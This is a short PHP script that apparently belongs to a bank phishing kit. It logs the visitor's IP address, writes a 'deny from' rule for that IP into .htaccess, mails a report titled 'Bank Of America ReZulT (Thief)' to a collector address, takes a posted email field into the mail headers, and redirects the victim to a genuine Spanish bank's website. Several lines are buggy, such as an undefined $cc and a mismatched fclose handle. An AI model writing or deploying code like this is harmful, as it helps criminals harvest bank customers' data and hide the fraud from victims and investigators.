<?

$dat3=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Date: ".$dat3."\n";
$message2 .= "deny from ".$ip."\n";


$recipient = "email@emmail.com";
$subject = "$ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$ff2=fopen(".htaccess","a");
fwrite($ff2,$message2);
fclose($ff);
	 mail("$cc", "Bank Of America ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.bancopopular.es");

}	
?>